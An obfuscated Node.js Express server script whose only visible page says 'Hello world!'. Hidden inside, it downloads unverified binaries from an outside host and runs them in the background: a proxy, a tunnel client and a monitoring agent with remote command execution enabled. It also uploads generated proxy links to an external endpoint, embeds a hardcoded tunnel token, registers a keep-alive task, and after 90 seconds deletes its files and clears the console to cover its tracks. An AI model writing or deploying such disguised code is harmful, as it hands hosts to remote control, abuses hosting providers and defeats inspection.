const _0x185b4b=_0xf4d6;(function(_0x434b11,_0x597252){const _0x2246e3=_0xf4d6,_0x917778=_0x434b11();while(!![]){try{const _0x328e19=parseInt(_0x2246e3(0x1da))/0x1*(parseInt(_0x2246e3(0x255))/0x2)+-parseInt(_0x2246e3(0x1c9))/0x3+-parseInt(_0x2246e3(0x209))/0x4+parseInt(_0x2246e3(0x22b))/0x5*(parseInt(_0x2246e3(0x246))/0x6)+-parseInt(_0x2246e3(0x1f9))/0x7+parseInt(_0x2246e3(0x215))/0x8+parseInt(_0x2246e3(0x21b))/0x9;if(_0x328e19===_0x597252)break;else _0x917778['push'](_0x917778['shift']());}catch(_0x112b8a){_0x917778['push'](_0x917778['shift']());}}}(_0x1772,0xcab5c));const express=require(_0x185b4b(0x21d)),app=express(),axios=require(_0x185b4b(0x19b)),os=require('os'),fs=require('fs'),path=require(_0x185b4b(0x1c4)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x185b4b(0x1fc)]),{execSync}=require(_0x185b4b(0x221)),UPLOAD_URL=process[_0x185b4b(0x1ce)][_0x185b4b(0x1e0)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x185b4b(0x1ce)][_0x185b4b(0x247)]||_0x185b4b(0x1bd),SUB_PATH=process[_0x185b4b(0x1ce)][_0x185b4b(0x229)]||_0x185b4b(0x22e),PORT=process[_0x185b4b(0x1ce)]['SERVER_PORT']||process['env'][_0x185b4b(0x206)]||0xbb8,UUID=process[_0x185b4b(0x1ce)][_0x185b4b(0x226)]||_0x185b4b(0x241),NEZHA_SERVER=process[_0x185b4b(0x1ce)][_0x185b4b(0x1ab)]||'',NEZHA_PORT=process[_0x185b4b(0x1ce)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x185b4b(0x1a2)]||_0x185b4b(0x210),ARGO_AUTH=process[_0x185b4b(0x1ce)][_0x185b4b(0x227)]||'eyJhIjoiMDU4OTRlZjFmYTc3MTk0Y2FjMWE4NGE5NDJkYzAzNGIiLCJ0IjoiOWI0NDdkODgtMWY3OS00ZDRkLThjODYtODg5MzkxOTQ1ZTBhIiwicyI6Ik9ESTBPRGhrWkRRdE1EQm1NaTAwWWpJNUxXRTBOVEV0TXpFM1l6RmpZVEptWTJGaiJ9',ARGO_PORT=process[_0x185b4b(0x1ce)][_0x185b4b(0x1d8)]||0x1f41,CFIP=process['env'][_0x185b4b(0x1cc)]||'cdns.doon.eu.org',CFPORT=process[_0x185b4b(0x1ce)][_0x185b4b(0x23e)]||0x1bb,NAME=process[_0x185b4b(0x1ce)]['NAME']||_0x185b4b(0x19f);!fs[_0x185b4b(0x20e)](FILE_PATH)?(fs[_0x185b4b(0x22a)](FILE_PATH),console[_0x185b4b(0x233)](FILE_PATH+_0x185b4b(0x24d))):console[_0x185b4b(0x233)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x149b7d=_0x185b4b,_0x586fb4=_0x149b7d(0x1a8);let _0x5bd647='';for(let _0x429712=0x0;_0x429712<0x6;_0x429712++){_0x5bd647+=_0x586fb4[_0x149b7d(0x1d7)](Math[_0x149b7d(0x204)](Math[_0x149b7d(0x245)]()*_0x586fb4['length']));}return _0x5bd647;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x185b4b(0x1c1)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x185b4b(0x1c1)](FILE_PATH,webName),botPath=path[_0x185b4b(0x1c1)](FILE_PATH,botName),subPath=path[_0x185b4b(0x1c1)](FILE_PATH,_0x185b4b(0x1cd)),listPath=path[_0x185b4b(0x1c1)](FILE_PATH,'list.txt'),bootLogPath=path[_0x185b4b(0x1c1)](FILE_PATH,_0x185b4b(0x24b)),configPath=path[_0x185b4b(0x1c1)](FILE_PATH,_0x185b4b(0x235));function deleteNodes(){const _0x4f6455=_0x185b4b;try{if(!UPLOAD_URL)return;if(!fs[_0x4f6455(0x20e)](subPath))return;let _0x17eec1;try{_0x17eec1=fs['readFileSync'](subPath,_0x4f6455(0x1d6));}catch{return null;}const _0x184860=Buffer[_0x4f6455(0x1db)](_0x17eec1,'base64')[_0x4f6455(0x1a9)](_0x4f6455(0x1d6)),_0x5770f2=_0x184860['split']('\x0a')[_0x4f6455(0x21a)](_0x461b50=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f6455(0x220)](_0x461b50));if(_0x5770f2[_0x4f6455(0x212)]===0x0)return;return axios[_0x4f6455(0x20d)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4f6455(0x225)]({'nodes':_0x5770f2}),{'headers':{'Content-Type':'application/json'}})[_0x4f6455(0x1aa)](_0x4ab99b=>{return null;}),null;}catch(_0x3bd4e4){return null;}}function cleanupOldFiles(){const _0x8c42de=_0x185b4b;try{const _0x914c8a=fs[_0x8c42de(0x250)](FILE_PATH);_0x914c8a[_0x8c42de(0x20c)](_0x1073b4=>{const _0x11f6e2=_0x8c42de,_0x5bca91=path[_0x11f6e2(0x1c1)](FILE_PATH,_0x1073b4);try{const _0x745bd6=fs[_0x11f6e2(0x248)](_0x5bca91);_0x745bd6[_0x11f6e2(0x222)]()&&fs[_0x11f6e2(0x1e6)](_0x5bca91);}catch(_0x241296){}});}catch(_0x511ec4){}}app['get']('/',function(_0x32218e,_0x5d0fe2){const _0x184dff=_0x185b4b;_0x5d0fe2[_0x184dff(0x1a4)](_0x184dff(0x231));});async function generateConfig(){const _0x258635=_0x185b4b,_0xef100b={'log':{'access':_0x258635(0x1c2),'error':_0x258635(0x1c2),'loglevel':_0x258635(0x199)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x258635(0x1c3),'settings':{'clients':[{'id':UUID,'flow':_0x258635(0x1d5)}],'decryption':_0x258635(0x199),'fallbacks':[{'dest':0xbb9},{'path':_0x258635(0x21c),'dest':0xbba},{'path':_0x258635(0x239),'dest':0xbbb},{'path':_0x258635(0x24f),'dest':0xbbc}]},'streamSettings':{'network':_0x258635(0x21e)}},{'port':0xbb9,'listen':_0x258635(0x1d2),'protocol':_0x258635(0x1c3),'settings':{'clients':[{'id':UUID}],'decryption':_0x258635(0x199)},'streamSettings':{'network':_0x258635(0x21e),'security':_0x258635(0x199)}},{'port':0xbba,'listen':_0x258635(0x1d2),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x258635(0x199)},'streamSettings':{'network':'ws','security':_0x258635(0x199),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x258635(0x20a),_0x258635(0x1be),_0x258635(0x249)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x258635(0x1d2),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x258635(0x239)}},'sniffing':{'enabled':!![],'destOverride':[_0x258635(0x20a),_0x258635(0x1be),_0x258635(0x249)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x258635(0x1d2),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x258635(0x199),'wsSettings':{'path':_0x258635(0x24f)}},'sniffing':{'enabled':!![],'destOverride':[_0x258635(0x20a),_0x258635(0x1be),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x258635(0x230)]},'outbounds':[{'protocol':_0x258635(0x1bb),'tag':_0x258635(0x1af)},{'protocol':_0x258635(0x24e),'tag':_0x258635(0x1b1)}]};fs['writeFileSync'](path[_0x258635(0x1c1)](FILE_PATH,_0x258635(0x235)),JSON['stringify'](_0xef100b,null,0x2));}function getSystemArchitecture(){const _0x447e98=_0x185b4b,_0xe13263=os[_0x447e98(0x217)]();return _0xe13263===_0x447e98(0x1f2)||_0xe13263===_0x447e98(0x1f6)||_0xe13263===_0x447e98(0x1c8)?_0x447e98(0x1f2):'amd';}function _0xf4d6(_0x3d3ee5,_0x4f917f){const _0x17720b=_0x1772();return _0xf4d6=function(_0xf4d655,_0xe1e1ae){_0xf4d655=_0xf4d655-0x199;let _0x11e07a=_0x17720b[_0xf4d655];return _0x11e07a;},_0xf4d6(_0x3d3ee5,_0x4f917f);}function downloadFile(_0x23323d,_0x2b131f,_0x4843cb){const _0x2c26db=_0x185b4b,_0x435084=_0x23323d;!fs['existsSync'](FILE_PATH)&&fs[_0x2c26db(0x22a)](FILE_PATH,{'recursive':!![]});const _0x13a9bd=fs[_0x2c26db(0x1bc)](_0x435084);axios({'method':_0x2c26db(0x1b3),'url':_0x2b131f,'responseType':_0x2c26db(0x22c)})[_0x2c26db(0x1f7)](_0x131d71=>{const _0x3e37c5=_0x2c26db;_0x131d71['data'][_0x3e37c5(0x207)](_0x13a9bd),_0x13a9bd['on']('finish',()=>{const _0x3aee75=_0x3e37c5;_0x13a9bd['close'](),console[_0x3aee75(0x233)](_0x3aee75(0x201)+path[_0x3aee75(0x1bf)](_0x435084)+_0x3aee75(0x1dd)),_0x4843cb(null,_0x435084);}),_0x13a9bd['on'](_0x3e37c5(0x22d),_0x43a4a4=>{const _0xaf4960=_0x3e37c5;fs['unlink'](_0x435084,()=>{});const _0x470fdb=_0xaf4960(0x201)+path['basename'](_0x435084)+_0xaf4960(0x23f)+_0x43a4a4[_0xaf4960(0x1ae)];console[_0xaf4960(0x22d)](_0x470fdb),_0x4843cb(_0x470fdb);});})['catch'](_0x14df5b=>{const _0x31a7e2=_0x2c26db,_0x16e53f='Download\x20'+path['basename'](_0x435084)+'\x20failed:\x20'+_0x14df5b[_0x31a7e2(0x1ae)];console[_0x31a7e2(0x22d)](_0x16e53f),_0x4843cb(_0x16e53f);});}async function downloadFilesAndRun(){const _0x44a391=_0x185b4b,_0x304c6f=getSystemArchitecture(),_0x3760c6=getFilesForArchitecture(_0x304c6f);if(_0x3760c6[_0x44a391(0x212)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5330c3=_0x3760c6[_0x44a391(0x1f4)](_0x3d8ab3=>{return new Promise((_0x187cd3,_0x51b8f1)=>{const _0xe8dfab=_0xf4d6;downloadFile(_0x3d8ab3[_0xe8dfab(0x1ad)],_0x3d8ab3[_0xe8dfab(0x1cb)],(_0x5711be,_0x1a5384)=>{_0x5711be?_0x51b8f1(_0x5711be):_0x187cd3(_0x1a5384);});});});try{await Promise[_0x44a391(0x1de)](_0x5330c3);}catch(_0x3f39e0){console[_0x44a391(0x22d)](_0x44a391(0x1b0),_0x3f39e0);return;}function _0x2e778e(_0x505b3f){const _0x16e826=_0x44a391,_0x25cab6=0x1fd;_0x505b3f[_0x16e826(0x20c)](_0x32238a=>{const _0x316985=_0x16e826;fs['existsSync'](_0x32238a)&&fs[_0x316985(0x23d)](_0x32238a,_0x25cab6,_0x4d3751=>{const _0x3bb0c4=_0x316985;_0x4d3751?console['error'](_0x3bb0c4(0x1b6)+_0x32238a+':\x20'+_0x4d3751):console['log'](_0x3bb0c4(0x1a7)+_0x32238a+':\x20'+_0x25cab6[_0x3bb0c4(0x1a9)](0x8));});});}const _0x1d60de=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2e778e(_0x1d60de);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x31788a=NEZHA_SERVER[_0x44a391(0x1b9)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x7114c7=new Set([_0x44a391(0x1eb),_0x44a391(0x1e3),'2096','2087',_0x44a391(0x21f),'2053']),_0x2c6579=_0x7114c7[_0x44a391(0x200)](_0x31788a)?'true':_0x44a391(0x1c0),_0x3f98eb=_0x44a391(0x22f)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x44a391(0x216)+_0x2c6579+_0x44a391(0x1ec)+UUID;fs['writeFileSync'](path[_0x44a391(0x1c1)](FILE_PATH,_0x44a391(0x1a0)),_0x3f98eb);const _0x352176=_0x44a391(0x1fd)+phpPath+_0x44a391(0x1fa)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x352176),console['log'](phpName+_0x44a391(0x1b5)),await new Promise(_0x5ee1d4=>setTimeout(_0x5ee1d4,0x3e8));}catch(_0x36b497){console[_0x44a391(0x22d)](_0x44a391(0x1cf)+_0x36b497);}}else{let _0x793790='';const _0x6a8f92=[_0x44a391(0x1eb),'8443',_0x44a391(0x1fe),_0x44a391(0x1a1),_0x44a391(0x21f),'2053'];_0x6a8f92[_0x44a391(0x1b9)](NEZHA_PORT)&&(_0x793790=_0x44a391(0x237));const _0x534dae=_0x44a391(0x1fd)+npmPath+_0x44a391(0x1b2)+NEZHA_SERVER+':'+NEZHA_PORT+_0x44a391(0x232)+NEZHA_KEY+'\x20'+_0x793790+_0x44a391(0x244);try{await exec(_0x534dae),console[_0x44a391(0x233)](npmName+'\x20is\x20running'),await new Promise(_0x54f55=>setTimeout(_0x54f55,0x3e8));}catch(_0x306270){console[_0x44a391(0x22d)](_0x44a391(0x205)+_0x306270);}}}else console['log'](_0x44a391(0x1e2));const _0x17bfab=_0x44a391(0x1fd)+webPath+_0x44a391(0x1f0)+FILE_PATH+_0x44a391(0x1ac);try{await exec(_0x17bfab),console[_0x44a391(0x233)](webName+_0x44a391(0x1b5)),await new Promise(_0x28eadc=>setTimeout(_0x28eadc,0x3e8));}catch(_0x989273){console['error']('web\x20running\x20error:\x20'+_0x989273);}if(fs[_0x44a391(0x20e)](botPath)){let _0xad75bd;if(ARGO_AUTH[_0x44a391(0x1d1)](/^[A-Z0-9a-z=]{120,250}$/))_0xad75bd=_0x44a391(0x240)+ARGO_AUTH;else ARGO_AUTH[_0x44a391(0x1d1)](/TunnelSecret/)?_0xad75bd='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x44a391(0x23a):_0xad75bd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x44a391(0x243)+ARGO_PORT;try{await exec(_0x44a391(0x1fd)+botPath+'\x20'+_0xad75bd+_0x44a391(0x24a)),console[_0x44a391(0x233)](botName+_0x44a391(0x1b5)),await new Promise(_0x481a43=>setTimeout(_0x481a43,0x7d0));}catch(_0x349d73){console['error']('Error\x20executing\x20command:\x20'+_0x349d73);}}await new Promise(_0xee31f4=>setTimeout(_0xee31f4,0x1388));}function getFilesForArchitecture(_0x43d14a){const _0x2a050c=_0x185b4b;let _0xd11ba4;_0x43d14a===_0x2a050c(0x1f2)?_0xd11ba4=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0xd11ba4=[{'fileName':webPath,'fileUrl':_0x2a050c(0x253)},{'fileName':botPath,'fileUrl':_0x2a050c(0x1ca)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2169d6=_0x43d14a===_0x2a050c(0x1f2)?_0x2a050c(0x1e4):_0x2a050c(0x224);_0xd11ba4[_0x2a050c(0x1e7)]({'fileName':npmPath,'fileUrl':_0x2169d6});}else{const _0x653e98=_0x43d14a===_0x2a050c(0x1f2)?_0x2a050c(0x1f1):_0x2a050c(0x1d3);_0xd11ba4['unshift']({'fileName':phpPath,'fileUrl':_0x653e98});}}return _0xd11ba4;}function _0x1772(){const _0x2492f9=['stringify','UUID','ARGO_AUTH','\x20>\x20nul\x202>&1','SUB_PATH','mkdirSync','1788205ICPCoU','stream','error','dingyue','\x0aclient_secret:\x20','https+local://8.8.8.8/dns-query','Hello\x20world!','\x20-p\x20','log','listen','config.json','App\x20is\x20running','--tls','platform','/vmess-argo','/tunnel.yml\x20run','del\x20/f\x20/q\x20','firefox','chmod','CFPORT','\x20failed:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','acbc9371-4aee-44bf-9b40-2f05a403031b','\x0a\x20\x20\x20\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','random','6KDkVoh','FILE_PATH','statSync','quic','\x20>/dev/null\x202>&1\x20&','boot.log','\x0a\x20\x20tunnel:\x20','\x20is\x20created','blackhole','/trojan-argo','readdirSync','pkill\x20-f\x20\x22[','Nodes\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/web','text/plain;\x20charset=utf-8','83936RiMXVT','none','Skipping\x20adding\x20automatic\x20access\x20task','axios','/api/add-subscriptions','split','&fp=firefox&type=ws&host=','zhuzhai','config.yaml','2087','ARGO_DOMAIN','application/json','send','ArgoDomain:','clear','Empowerment\x20success\x20for\x20','abcdefghijklmnopqrstuvwxyz','toString','catch','NEZHA_SERVER','/config.json\x20>/dev/null\x202>&1\x20&','fileName','message','direct','Error\x20downloading\x20files:','block','\x20-s\x20','get','writeFileSync','\x20is\x20running','Empowerment\x20failed\x20for\x20','ARGO_DOMAIN:','\x0a\x20\x20\x0atrojan://','includes','Subscription\x20uploaded\x20successfully','freedom','createWriteStream','./tmp','tls','basename','false','join','/dev/null','vless','path','tunnel.json','\x20>/dev/null\x202>&1','/sub.txt\x20saved\x20successfully','aarch64','2729649bqwolY','https://amd64.ssss.nyc.mn/bot','fileUrl','CFIP','sub.txt','env','php\x20running\x20error:\x20','readFileSync','match','127.0.0.1','https://amd64.ssss.nyc.mn/v1','automatic\x20access\x20task\x20added\x20successfully','xtls-rprx-vision','utf-8','charAt','ARGO_PORT','Error\x20reading\x20boot.log:','25cTjoxS','from','Content-Type','\x20successfully','all','taskkill\x20/f\x20/im\x20','UPLOAD_URL','TunnelSecret','NEZHA\x20variable\x20is\x20empty,skip\x20running','8443','https://arm64.ssss.nyc.mn/agent','/api/add-nodes','unlinkSync','unshift','Add\x20automatic\x20access\x20task\x20faild:\x20','?encryption=none&security=tls&sni=','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','443','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','win32','https://oooo.serv00.net/add-url','\x0a\x20\x20credentials-file:\x20','\x20-c\x20','https://arm64.ssss.nyc.mn/v1','arm','base64','map','status','arm64','then','Unhandled\x20error\x20in\x20startserver:','4909681QqogCJ','\x20-c\x20\x22','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','exec','nohup\x20','2096','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','has','Download\x20','\x0a\x20\x20\x0avmess://','\x0avless://','floor','npm\x20running\x20error:\x20','PORT','pipe','&path=%2Ftrojan-argo%3Fed%3D2560#','2850056JueTTx','http','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','forEach','post','existsSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','zhuzhai.xq03.dpdns.org','rm\x20-rf\x20','length','Error\x20in\x20startserver:','response','9109688WzpfSp','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','arch','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','filter','5476752nzWBnx','/vless-argo','express','tcp','2083','test','child_process','isFile','tunnel.yml','https://amd64.ssss.nyc.mn/agent'];_0x1772=function(){return _0x2492f9;};return _0x1772();}function argoType(){const _0x14cf17=_0x185b4b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x14cf17(0x233)](_0x14cf17(0x20b));return;}if(ARGO_AUTH[_0x14cf17(0x1b9)](_0x14cf17(0x1e1))){fs[_0x14cf17(0x1b4)](path[_0x14cf17(0x1c1)](FILE_PATH,_0x14cf17(0x1c5)),ARGO_AUTH);const _0x16f3c8=_0x14cf17(0x24c)+ARGO_AUTH['split']('\x22')[0xb]+_0x14cf17(0x1ef)+path[_0x14cf17(0x1c1)](FILE_PATH,_0x14cf17(0x1c5))+_0x14cf17(0x1ff)+ARGO_DOMAIN+_0x14cf17(0x218)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x14cf17(0x1b4)](path[_0x14cf17(0x1c1)](FILE_PATH,_0x14cf17(0x223)),_0x16f3c8);}else console[_0x14cf17(0x233)](_0x14cf17(0x219));}argoType();async function extractDomains(){const _0x4ff226=_0x185b4b;let _0x3bd74d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3bd74d=ARGO_DOMAIN,console[_0x4ff226(0x233)](_0x4ff226(0x1b7),_0x3bd74d),await _0x5a9d56(_0x3bd74d);else try{const _0x2c4383=fs['readFileSync'](path[_0x4ff226(0x1c1)](FILE_PATH,_0x4ff226(0x24b)),_0x4ff226(0x1d6)),_0x457d74=_0x2c4383[_0x4ff226(0x19d)]('\x0a'),_0x184481=[];_0x457d74[_0x4ff226(0x20c)](_0x2604e7=>{const _0x49ed3d=_0x2604e7['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x49ed3d){const _0x1510c9=_0x49ed3d[0x1];_0x184481['push'](_0x1510c9);}});if(_0x184481[_0x4ff226(0x212)]>0x0)_0x3bd74d=_0x184481[0x0],console[_0x4ff226(0x233)](_0x4ff226(0x1a5),_0x3bd74d),await _0x5a9d56(_0x3bd74d);else{console['log'](_0x4ff226(0x1ea)),fs[_0x4ff226(0x1e6)](path[_0x4ff226(0x1c1)](FILE_PATH,_0x4ff226(0x24b)));async function _0x4cbcd0(){const _0x4784e6=_0x4ff226;try{process[_0x4784e6(0x238)]===_0x4784e6(0x1ed)?await exec(_0x4784e6(0x1df)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x4784e6(0x251)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3304cd){}}_0x4cbcd0(),await new Promise(_0x396d1c=>setTimeout(_0x396d1c,0xbb8));const _0x827708='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4ff226(0x243)+ARGO_PORT;try{await exec(_0x4ff226(0x1fd)+botPath+'\x20'+_0x827708+_0x4ff226(0x24a)),console['log'](botName+_0x4ff226(0x1b5)),await new Promise(_0x54ba6f=>setTimeout(_0x54ba6f,0xbb8)),await extractDomains();}catch(_0x242131){console[_0x4ff226(0x22d)]('Error\x20executing\x20command:\x20'+_0x242131);}}}catch(_0x2da81b){console[_0x4ff226(0x22d)](_0x4ff226(0x1d9),_0x2da81b);}async function _0x5a9d56(_0x41d9de){const _0x53be85=_0x4ff226,_0x1c29bd=execSync(_0x53be85(0x1fb),{'encoding':_0x53be85(0x1d6)}),_0x2026ab=_0x1c29bd['trim'](),_0x43ff86=NAME?NAME+'-'+_0x2026ab:_0x2026ab;return new Promise(_0x55ce9a=>{setTimeout(()=>{const _0x90c857=_0xf4d6,_0x155b4b={'v':'2','ps':''+_0x43ff86,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x90c857(0x199),'net':'ws','type':_0x90c857(0x199),'host':_0x41d9de,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x41d9de,'alpn':'','fp':_0x90c857(0x23c)},_0x5d8ea4=_0x90c857(0x203)+UUID+'@'+CFIP+':'+CFPORT+_0x90c857(0x1e9)+_0x41d9de+_0x90c857(0x19e)+_0x41d9de+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x43ff86+_0x90c857(0x202)+Buffer[_0x90c857(0x1db)](JSON[_0x90c857(0x225)](_0x155b4b))[_0x90c857(0x1a9)](_0x90c857(0x1f3))+_0x90c857(0x1b8)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x41d9de+_0x90c857(0x19e)+_0x41d9de+_0x90c857(0x208)+_0x43ff86+_0x90c857(0x242);console[_0x90c857(0x233)](Buffer[_0x90c857(0x1db)](_0x5d8ea4)[_0x90c857(0x1a9)](_0x90c857(0x1f3))),fs[_0x90c857(0x1b4)](subPath,Buffer[_0x90c857(0x1db)](_0x5d8ea4)['toString'](_0x90c857(0x1f3))),console['log'](FILE_PATH+_0x90c857(0x1c7)),uploadNodes(),app[_0x90c857(0x1b3)]('/'+SUB_PATH,(_0x175b56,_0x4d2403)=>{const _0x3e2a6f=_0x90c857,_0x4251e1=Buffer[_0x3e2a6f(0x1db)](_0x5d8ea4)[_0x3e2a6f(0x1a9)]('base64');_0x4d2403['set'](_0x3e2a6f(0x1dc),_0x3e2a6f(0x254)),_0x4d2403[_0x3e2a6f(0x1a4)](_0x4251e1);}),_0x55ce9a(_0x5d8ea4);},0x7d0);});}}async function uploadNodes(){const _0x59adb4=_0x185b4b;if(UPLOAD_URL&&PROJECT_URL){const _0x488d40=PROJECT_URL+'/'+SUB_PATH,_0x5cffd1={'subscription':[_0x488d40]};try{const _0x4419ff=await axios['post'](UPLOAD_URL+_0x59adb4(0x19c),_0x5cffd1,{'headers':{'Content-Type':_0x59adb4(0x1a3)}});return _0x4419ff&&_0x4419ff[_0x59adb4(0x1f5)]===0xc8?(console[_0x59adb4(0x233)](_0x59adb4(0x1ba)),_0x4419ff):null;}catch(_0x1d3485){if(_0x1d3485['response']){if(_0x1d3485[_0x59adb4(0x214)][_0x59adb4(0x1f5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x59adb4(0x20e)](listPath))return;const _0x4b6695=fs[_0x59adb4(0x1d0)](listPath,_0x59adb4(0x1d6)),_0x4edf21=_0x4b6695[_0x59adb4(0x19d)]('\x0a')[_0x59adb4(0x21a)](_0x12ec9d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x59adb4(0x220)](_0x12ec9d));if(_0x4edf21[_0x59adb4(0x212)]===0x0)return;const _0x47f88b=JSON[_0x59adb4(0x225)]({'nodes':_0x4edf21});try{const _0x164e66=await axios['post'](UPLOAD_URL+_0x59adb4(0x1e5),_0x47f88b,{'headers':{'Content-Type':_0x59adb4(0x1a3)}});return _0x164e66&&_0x164e66[_0x59adb4(0x1f5)]===0xc8?(console[_0x59adb4(0x233)](_0x59adb4(0x252)),_0x164e66):null;}catch(_0x21d1a3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x508a33=_0xf4d6,_0x287a27=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x287a27['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x287a27['push'](phpPath);process[_0x508a33(0x238)]===_0x508a33(0x1ed)?exec(_0x508a33(0x23b)+_0x287a27[_0x508a33(0x1c1)]('\x20')+_0x508a33(0x228),_0x4df69f=>{const _0x1deeef=_0x508a33;console['clear'](),console['log'](_0x1deeef(0x236)),console[_0x1deeef(0x233)](_0x1deeef(0x20f));}):exec(_0x508a33(0x211)+_0x287a27[_0x508a33(0x1c1)]('\x20')+_0x508a33(0x1c6),_0x360dcf=>{const _0x140cb6=_0x508a33;console[_0x140cb6(0x1a6)](),console[_0x140cb6(0x233)](_0x140cb6(0x236)),console[_0x140cb6(0x233)](_0x140cb6(0x20f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4f4faf=_0x185b4b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4f4faf(0x233)](_0x4f4faf(0x19a));return;}try{const _0x9a92f8=await axios[_0x4f4faf(0x20d)](_0x4f4faf(0x1ee),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4f4faf(0x1a3)}});return console[_0x4f4faf(0x233)](_0x4f4faf(0x1d4)),_0x9a92f8;}catch(_0xbebfc2){return console[_0x4f4faf(0x22d)](_0x4f4faf(0x1e8)+_0xbebfc2[_0x4f4faf(0x1ae)]),null;}}async function startserver(){const _0x2837bb=_0x185b4b;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3c9b0e){console['error'](_0x2837bb(0x213),_0x3c9b0e);}}startserver()['catch'](_0x4ebcf2=>{const _0x58196b=_0x185b4b;console[_0x58196b(0x22d)](_0x58196b(0x1f8),_0x4ebcf2);}),app[_0x185b4b(0x234)](PORT,()=>console[_0x185b4b(0x233)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
